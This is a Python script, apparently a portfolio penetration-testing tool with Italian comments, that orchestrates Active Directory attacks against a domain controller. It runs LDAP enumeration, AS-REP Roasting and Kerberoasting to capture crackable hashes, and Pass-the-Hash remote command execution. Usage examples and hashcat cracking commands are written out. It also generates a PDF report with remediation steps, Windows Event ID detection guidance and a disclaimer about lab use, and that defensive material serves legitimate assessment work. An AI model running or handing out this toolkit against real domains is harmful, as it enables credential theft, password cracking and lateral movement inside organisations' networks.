#!/usr/bin/env python3
"""
AD Attack Toolkit - ad_attack.py
Script master che orchestra enumerazione, AS-REP Roasting, Kerberoasting,
Pass-the-Hash e genera un report PDF con risultati e remediation.

Uso:
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p Password --all
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p Password --enum
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p Password --asrep
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p Password --kerberoast
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p Password --pth --pth-user admin.helpdesk --nthash 520126...
"""

import argparse
import json
import sys
import os
import logging
from datetime import datetime

# --- IMPORT MODULI INTERNI ---
# Importa le funzioni dai singoli script
from ad_enum import connect_ldap, enum_users, enum_groups, find_asrep_targets, find_kerberoast_targets, find_domain_admins, save_results
from asreproast import asrep_roast, save_hashes as save_asrep_hashes
from kerberoast import get_tgt, request_tgs, save_hashes as save_tgs_hashes
from pth import pth_wmiexec

# --- PDF REPORT ---
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.colors import HexColor
from reportlab.lib.units import cm
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
from reportlab.lib.enums import TA_CENTER, TA_LEFT


# Setup logging
def setup_logging(log_file='ad_attack.log'):
    logger = logging.getLogger('ad_attack')
    logger.setLevel(logging.DEBUG)

    # File handler
    fh = logging.FileHandler(log_file)
    fh.setLevel(logging.DEBUG)

    # Console handler
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)

    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter)
    ch.setFormatter(formatter)

    logger.addHandler(fh)
    logger.addHandler(ch)

    return logger


def run_enum(dc_ip, username, password):
    """Esegue enumerazione AD."""
    print("\n" + "=" * 60)
    print("  FASE 1: ENUMERAZIONE AD")
    print("=" * 60)

    conn, base_dn = connect_ldap(dc_ip, username, password)
    users = enum_users(conn, base_dn)
    groups = enum_groups(conn, base_dn)
    asrep_targets = find_asrep_targets(users)
    kerb_targets = find_kerberoast_targets(users)
    admins = find_domain_admins(conn, base_dn, users)
    save_results(users, groups, asrep_targets, kerb_targets, admins, 'enum_results.json')
    conn.unbind()

    return {
        'users': users,
        'groups': groups,
        'asrep_targets': asrep_targets,
        'kerberoast_targets': kerb_targets,
        'domain_admins': admins,
    }


def run_asrep(dc_ip, domain, enum_data=None):
    """Esegue AS-REP Roasting."""
    print("\n" + "=" * 60)
    print("  FASE 2: AS-REP ROASTING")
    print("=" * 60)

    # Carica target
    if enum_data and enum_data.get('asrep_targets'):
        targets = [u['username'] for u in enum_data['asrep_targets']]
    else:
        with open('enum_results.json', 'r') as f:
            data = json.load(f)
        targets = data.get('asrep_targets', [])

    if not targets:
        print("[-] Nessun target AS-REP Roasting trovato.")
        return {'hashes': [], 'targets': []}

    print(f"[+] {len(targets)} target trovati")

    hashes = []
    results = []
    for username in targets:
        h = asrep_roast(dc_ip, domain, username)
        if h:
            hashes.append(h)
            results.append({'username': username, 'hash': h})

    if hashes:
        save_asrep_hashes(hashes, 'asrep_hashes.txt')

    return {'hashes': hashes, 'targets': results}


def run_kerberoast(dc_ip, domain, username, password, enum_data=None):
    """Esegue Kerberoasting."""
    print("\n" + "=" * 60)
    print("  FASE 3: KERBEROASTING")
    print("=" * 60)

    # Ottieni TGT
    tgt, cipher, session_key = get_tgt(dc_ip, domain, username, password)

    # Carica target SPN
    if enum_data and enum_data.get('kerberoast_targets'):
        spn_list = []
        for t in enum_data['kerberoast_targets']:
            spn_list.extend(t['spn'])
    else:
        with open('enum_results.json', 'r') as f:
            data = json.load(f)
        targets = data.get('kerberoast_targets', [])
        spn_list = []
        for t in targets:
            spn_list.extend(t['spn'])

    if not spn_list:
        print("[-] Nessun SPN target trovato.")
        return {'hashes': [], 'targets': []}

    print(f"[+] {len(spn_list)} SPN trovati")

    hashes = []
    results = []
    for spn in spn_list:
        h, etype = request_tgs(dc_ip, domain, tgt, cipher, session_key, spn)
        if h:
            hashes.append((h, etype))
            results.append({'spn': spn, 'hash': h, 'etype': etype})

    if hashes:
        save_tgs_hashes(hashes, 'tgs_hashes.txt')

    return {'hashes': hashes, 'targets': results}


def run_pth(dc_ip, domain, pth_user, nthash, command=None):
    """Esegue Pass-the-Hash."""
    print("\n" + "=" * 60)
    print("  FASE 4: PASS-THE-HASH")
    print("=" * 60)

    success = pth_wmiexec(dc_ip, domain, pth_user, nthash, command)

    return {
        'success': success,
        'username': pth_user,
        'nthash': nthash,
    }


def generate_pdf(results, dc_ip, domain, output_file='ad_attack_report.pdf'):
    """
    Genera il report PDF con executive summary, dettagli tecnici e remediation.
    """
    print("\n" + "=" * 60)
    print("  GENERAZIONE REPORT PDF")
    print("=" * 60)

    doc = SimpleDocTemplate(output_file, pagesize=A4,
                           topMargin=2*cm, bottomMargin=2*cm,
                           leftMargin=2*cm, rightMargin=2*cm)

    styles = getSampleStyleSheet()

    # Stili custom
    styles.add(ParagraphStyle(
        name='ReportTitle',
        parent=styles['Title'],
        fontSize=24,
        textColor=HexColor('#1a5276'),
        spaceAfter=30,
        alignment=TA_CENTER,
    ))
    styles.add(ParagraphStyle(
        name='SectionHeader',
        parent=styles['Heading1'],
        fontSize=16,
        textColor=HexColor('#2e75b6'),
        spaceBefore=20,
        spaceAfter=10,
    ))
    styles.add(ParagraphStyle(
        name='SubHeader',
        parent=styles['Heading2'],
        fontSize=13,
        textColor=HexColor('#444444'),
        spaceBefore=15,
        spaceAfter=8,
    ))
    styles.add(ParagraphStyle(
        name='BodyText2',
        parent=styles['BodyText'],
        fontSize=10,
        spaceAfter=6,
    ))
    styles.add(ParagraphStyle(
        name='Finding',
        parent=styles['BodyText'],
        fontSize=10,
        textColor=HexColor('#c0392b'),
        spaceAfter=4,
    ))
    styles.add(ParagraphStyle(
        name='Remediation',
        parent=styles['BodyText'],
        fontSize=10,
        textColor=HexColor('#27ae60'),
        spaceAfter=4,
    ))

    story = []

    # --- COPERTINA ---
    story.append(Spacer(1, 3*cm))
    story.append(Paragraph("AD ATTACK TOOLKIT", styles['ReportTitle']))
    story.append(Paragraph("Active Directory Security Assessment Report", styles['Heading2']))
    story.append(Spacer(1, 1*cm))

    info_data = [
        ['Target Domain Controller', dc_ip],
        ['Domain', domain],
        ['Date', datetime.now().strftime('%Y-%m-%d %H:%M')],
        ['Tool', 'AD Attack Toolkit v1.0'],
        ['Author', 'Penetration Test Report'],
    ]
    info_table = Table(info_data, colWidths=[6*cm, 10*cm])
    info_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (0, -1), HexColor('#e8f0fe')),
        ('GRID', (0, 0), (-1, -1), 0.5, HexColor('#cccccc')),
        ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, -1), 10),
        ('PADDING', (0, 0), (-1, -1), 8),
    ]))
    story.append(info_table)
    story.append(PageBreak())

    # --- EXECUTIVE SUMMARY ---
    story.append(Paragraph("1. Executive Summary", styles['SectionHeader']))

    enum_data = results.get('enum', {})
    asrep_data = results.get('asrep', {})
    kerb_data = results.get('kerberoast', {})
    pth_data = results.get('pth', {})

    total_users = len(enum_data.get('users', []))
    asrep_count = len(asrep_data.get('targets', []))
    kerb_count = len(kerb_data.get('targets', []))
    pth_success = pth_data.get('success', False)
    admin_count = len(enum_data.get('domain_admins', []))

    summary = f"""
    This assessment identified significant security vulnerabilities in the Active Directory
    environment at {domain}. A total of {total_users} user accounts were enumerated, with
    {asrep_count} accounts vulnerable to AS-REP Roasting and {kerb_count} service accounts
    vulnerable to Kerberoasting. {'Pass-the-Hash authentication was successful, demonstrating lateral movement capability.' if pth_success else ''}
    {admin_count} Domain Admin accounts were identified.
    """
    story.append(Paragraph(summary.strip(), styles['BodyText2']))
    story.append(Spacer(1, 0.5*cm))

    # Severity table
    severity_data = [
        ['Finding', 'Severity', 'Count'],
        ['AS-REP Roasting Vulnerable Users', 'HIGH', str(asrep_count)],
        ['Kerberoastable Service Accounts', 'HIGH', str(kerb_count)],
        ['Pass-the-Hash Success', 'CRITICAL' if pth_success else 'N/A', 'Yes' if pth_success else 'N/A'],
        ['Domain Admin Accounts', 'INFO', str(admin_count)],
    ]
    severity_table = Table(severity_data, colWidths=[8*cm, 4*cm, 4*cm])
    severity_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), HexColor('#2e75b6')),
        ('TEXTCOLOR', (0, 0), (-1, 0), HexColor('#ffffff')),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('GRID', (0, 0), (-1, -1), 0.5, HexColor('#cccccc')),
        ('FONTSIZE', (0, 0), (-1, -1), 10),
        ('PADDING', (0, 0), (-1, -1), 8),
        ('ALIGN', (1, 0), (-1, -1), 'CENTER'),
    ]))
    # Color severity cells
    for i, row in enumerate(severity_data[1:], 1):
        if row[1] == 'CRITICAL':
            severity_table.setStyle(TableStyle([('TEXTCOLOR', (1, i), (1, i), HexColor('#c0392b'))]))
        elif row[1] == 'HIGH':
            severity_table.setStyle(TableStyle([('TEXTCOLOR', (1, i), (1, i), HexColor('#e67e22'))]))

    story.append(severity_table)
    story.append(PageBreak())

    # --- DETTAGLI TECNICI ---
    story.append(Paragraph("2. Technical Details", styles['SectionHeader']))

    # 2.1 Enumeration
    story.append(Paragraph("2.1 Active Directory Enumeration", styles['SubHeader']))
    story.append(Paragraph(
        f"LDAP enumeration against {dc_ip} revealed {total_users} user accounts "
        f"and {len(enum_data.get('groups', []))} groups.",
        styles['BodyText2']
    ))

    if enum_data.get('users'):
        user_table_data = [['Username', 'Full Name', 'Flags']]
        for u in enum_data['users']:
            flags = []
            if u.get('no_preauth'):
                flags.append('NO_PREAUTH')
            if u.get('has_spn'):
                flags.append('HAS_SPN')
            user_table_data.append([
                u.get('username', ''),
                u.get('fullname', ''),
                ', '.join(flags) if flags else '-'
            ])

        user_table = Table(user_table_data, colWidths=[5*cm, 6*cm, 5*cm])
        user_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), HexColor('#2e75b6')),
            ('TEXTCOLOR', (0, 0), (-1, 0), HexColor('#ffffff')),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('GRID', (0, 0), (-1, -1), 0.5, HexColor('#cccccc')),
            ('FONTSIZE', (0, 0), (-1, -1), 9),
            ('PADDING', (0, 0), (-1, -1), 6),
        ]))
        story.append(user_table)

    story.append(Spacer(1, 0.5*cm))

    # 2.2 AS-REP Roasting
    story.append(Paragraph("2.2 AS-REP Roasting", styles['SubHeader']))
    if asrep_data.get('targets'):
        story.append(Paragraph(
            f"{asrep_count} users found with Kerberos pre-authentication disabled. "
            f"AS-REP hashes were captured and saved for offline cracking.",
            styles['Finding']
        ))
        asrep_table_data = [['Username', 'Hash Captured']]
        for t in asrep_data['targets']:
            asrep_table_data.append([t['username'], 'Yes'])

        asrep_table = Table(asrep_table_data, colWidths=[5*cm, 5*cm])
        asrep_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), HexColor('#e67e22')),
            ('TEXTCOLOR', (0, 0), (-1, 0), HexColor('#ffffff')),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('GRID', (0, 0), (-1, -1), 0.5, HexColor('#cccccc')),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('PADDING', (0, 0), (-1, -1), 6),
        ]))
        story.append(asrep_table)
        story.append(Paragraph(
            "Cracking command: hashcat -m 18200 asrep_hashes.txt wordlist.txt",
            styles['BodyText2']
        ))
    else:
        story.append(Paragraph("No AS-REP Roasting vulnerabilities found.", styles['BodyText2']))

    story.append(Spacer(1, 0.5*cm))

    # 2.3 Kerberoasting
    story.append(Paragraph("2.3 Kerberoasting", styles['SubHeader']))
    if kerb_data.get('targets'):
        story.append(Paragraph(
            f"{kerb_count} service accounts with SPN found. "
            f"TGS hashes were captured for offline cracking.",
            styles['Finding']
        ))
        kerb_table_data = [['SPN', 'Encryption', 'Hash Captured']]
        for t in kerb_data['targets']:
            etype_name = {23: 'RC4-HMAC', 17: 'AES128', 18: 'AES256'}.get(t.get('etype'), str(t.get('etype', '?')))
            kerb_table_data.append([t['spn'], etype_name, 'Yes'])

        kerb_table = Table(kerb_table_data, colWidths=[7*cm, 3*cm, 3*cm])
        kerb_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), HexColor('#e67e22')),
            ('TEXTCOLOR', (0, 0), (-1, 0), HexColor('#ffffff')),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('GRID', (0, 0), (-1, -1), 0.5, HexColor('#cccccc')),
            ('FONTSIZE', (0, 0), (-1, -1), 9),
            ('PADDING', (0, 0), (-1, -1), 6),
        ]))
        story.append(kerb_table)
        story.append(Paragraph(
            "Cracking command: hashcat -m 13100 tgs_hashes.txt wordlist.txt",
            styles['BodyText2']
        ))
    else:
        story.append(Paragraph("No Kerberoastable service accounts found.", styles['BodyText2']))

    story.append(Spacer(1, 0.5*cm))

    # 2.4 Pass-the-Hash
    story.append(Paragraph("2.4 Pass-the-Hash", styles['SubHeader']))
    if pth_data.get('success'):
        story.append(Paragraph(
            f"Pass-the-Hash authentication successful as {pth_data.get('username', 'N/A')}. "
            f"NTLM hash was used to authenticate without knowing the plaintext password. "
            f"This demonstrates lateral movement capability within the domain.",
            styles['Finding']
        ))
    elif pth_data:
        story.append(Paragraph("Pass-the-Hash authentication failed.", styles['BodyText2']))
    else:
        story.append(Paragraph("Pass-the-Hash was not tested.", styles['BodyText2']))

    story.append(PageBreak())

    # --- REMEDIATION ---
    story.append(Paragraph("3. Remediation Recommendations", styles['SectionHeader']))

    remediations = [
        ("AS-REP Roasting Mitigation", [
            "Enable Kerberos pre-authentication for ALL user accounts. In AD Users and Computers, uncheck 'Do not require Kerberos preauthentication' for each affected user.",
            "Enforce strong password policies (minimum 16 characters) for all accounts.",
            "Monitor Event ID 4768 (TGT requests) for unusual patterns, especially requests without pre-authentication.",
            "Regularly audit accounts with the DONT_REQ_PREAUTH flag using PowerShell: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}",
        ]),
        ("Kerberoasting Mitigation", [
            "Use Group Managed Service Accounts (gMSA) which automatically rotate complex passwords.",
            "Set service account passwords to 30+ characters, randomly generated.",
            "Rotate service account passwords regularly (every 30-90 days).",
            "Monitor Event ID 4769 (TGS requests) for high-volume requests targeting service accounts.",
            "Minimize the number of accounts with SPNs registered.",
        ]),
        ("Pass-the-Hash Mitigation", [
            "Enable Credential Guard (Windows 10/11 Enterprise) to protect NTLM hashes in memory.",
            "Implement Local Administrator Password Solution (LAPS) to randomize local admin passwords.",
            "Restrict privileged accounts from logging into workstations (use tiered access model).",
            "Monitor Event ID 4776 (NTLM authentication) for anomalous patterns.",
            "Disable NTLM where possible in favor of Kerberos authentication.",
        ]),
        ("General Active Directory Hardening", [
            "Implement least privilege access model across the domain.",
            "Enable Advanced Audit Policies for comprehensive logging.",
            "Deploy a SIEM solution to centralize and correlate security events.",
            "Conduct regular Active Directory security assessments.",
            "Implement Protected Users security group for privileged accounts.",
        ]),
    ]

    for title, items in remediations:
        story.append(Paragraph(title, styles['SubHeader']))
        for item in items:
            story.append(Paragraph(f"  \u2022 {item}", styles['Remediation']))
        story.append(Spacer(1, 0.3*cm))

    # --- BLUE TEAM DETECTION ---
    story.append(PageBreak())
    story.append(Paragraph("4. Blue Team Detection Guide", styles['SectionHeader']))

    story.append(Paragraph(
        "The following Windows Event IDs should be monitored to detect the attacks demonstrated in this assessment:",
        styles['BodyText2']
    ))

    detection_data = [
        ['Event ID', 'Description', 'Attack Detected'],
        ['4768', 'TGT Request (Kerberos Authentication)', 'AS-REP Roasting'],
        ['4769', 'TGS Request (Service Ticket)', 'Kerberoasting'],
        ['4776', 'NTLM Authentication', 'Pass-the-Hash'],
        ['4625', 'Failed Logon', 'Brute Force / Credential Stuffing'],
        ['4672', 'Special Privileges Assigned', 'Privilege Escalation'],
    ]

    detection_table = Table(detection_data, colWidths=[3*cm, 7*cm, 6*cm])
    detection_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), HexColor('#1a5276')),
        ('TEXTCOLOR', (0, 0), (-1, 0), HexColor('#ffffff')),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('GRID', (0, 0), (-1, -1), 0.5, HexColor('#cccccc')),
        ('FONTSIZE', (0, 0), (-1, -1), 9),
        ('PADDING', (0, 0), (-1, -1), 6),
    ]))
    story.append(detection_table)

    # --- DISCLAIMER ---
    story.append(Spacer(1, 1*cm))
    story.append(Paragraph("Disclaimer", styles['SectionHeader']))
    story.append(Paragraph(
        "This assessment was conducted in an authorized lab environment for educational and portfolio purposes only. "
        "The tools and techniques described in this report should NEVER be used against production systems without "
        "explicit written authorization. Unauthorized access to computer systems is illegal and punishable by law.",
        styles['BodyText2']
    ))

    # Build PDF
    doc.build(story)
    print(f"\n[+] Report PDF generato: {output_file}")


def main():
    parser = argparse.ArgumentParser(
        description='AD Attack Toolkit - Automated Active Directory Security Assessment',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Esempi:
  # Esegui tutto
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p P4ssw0rd --all

  # Solo enumerazione
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p P4ssw0rd --enum

  # Solo AS-REP Roasting
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p P4ssw0rd --asrep

  # Tutto + Pass-the-Hash
  python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p P4ssw0rd --all --pth --pth-user admin.helpdesk --nthash abc123...
        """
    )

    parser.add_argument('--dc-ip', required=True, help='IP del Domain Controller')
    parser.add_argument('--domain', required=True, help='Nome dominio (es. psychosec.local)')
    parser.add_argument('-u', '--username', required=True, help='Username per autenticazione')
    parser.add_argument('-p', '--password', required=True, help='Password')

    # Modalità
    parser.add_argument('--all', action='store_true', help='Esegui tutti gli attacchi (enum + asrep + kerberoast)')
    parser.add_argument('--enum', action='store_true', help='Solo enumerazione')
    parser.add_argument('--asrep', action='store_true', help='Solo AS-REP Roasting')
    parser.add_argument('--kerberoast', action='store_true', help='Solo Kerberoasting')

    # Pass-the-Hash (opzionale, richiede hash)
    parser.add_argument('--pth', action='store_true', help='Esegui Pass-the-Hash')
    parser.add_argument('--pth-user', help='Username per PtH')
    parser.add_argument('--nthash', help='NTLM hash per PtH')
    parser.add_argument('--command', help='Comando da eseguire via PtH')

    # Output
    parser.add_argument('--report', default='ad_attack_report.pdf', help='Nome file report PDF')
    parser.add_argument('--no-report', action='store_true', help='Non generare report PDF')

    args = parser.parse_args()

    # Validazione
    if not any([args.all, args.enum, args.asrep, args.kerberoast, args.pth]):
        parser.error("Specifica almeno una modalità: --all, --enum, --asrep, --kerberoast, --pth")

    if args.pth and (not args.pth_user or not args.nthash):
        parser.error("--pth richiede --pth-user e --nthash")

    # Banner
    print("""
    ╔══════════════════════════════════════════════════╗
    ║          AD ATTACK TOOLKIT v1.0                  ║
    ║          Active Directory Security Assessment    ║
    ╠══════════════════════════════════════════════════╣
    ║  Target DC:  {:<35s}║
    ║  Domain:     {:<35s}║
    ║  User:       {:<35s}║
    ╚══════════════════════════════════════════════════╝
    """.format(args.dc_ip, args.domain, args.username))

    logger = setup_logging()
    logger.info(f"Starting AD Attack Toolkit against {args.dc_ip} ({args.domain})")

    results = {}

    try:
        # Enumerazione
        if args.all or args.enum:
            logger.info("Starting enumeration")
            results['enum'] = run_enum(args.dc_ip, f"{args.domain.split('.')[0].upper()}\\{args.username}", args.password)

        # AS-REP Roasting
        if args.all or args.asrep:
            logger.info("Starting AS-REP Roasting")
            results['asrep'] = run_asrep(args.dc_ip, args.domain, results.get('enum'))

        # Kerberoasting
        if args.all or args.kerberoast:
            logger.info("Starting Kerberoasting")
            results['kerberoast'] = run_kerberoast(args.dc_ip, args.domain, args.username, args.password, results.get('enum'))

        # Pass-the-Hash
        if args.pth:
            logger.info("Starting Pass-the-Hash")
            results['pth'] = run_pth(args.dc_ip, args.domain, args.pth_user, args.nthash, args.command)

        # Report PDF
        if not args.no_report:
            generate_pdf(results, args.dc_ip, args.domain, args.report)

        print("\n" + "=" * 60)
        print("  ASSESSMENT COMPLETATO")
        print("=" * 60)
        logger.info("Assessment completed successfully")

    except KeyboardInterrupt:
        print("\n[-] Interrotto dall'utente.")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Errore: {e}")
        print(f"\n[-] Errore: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
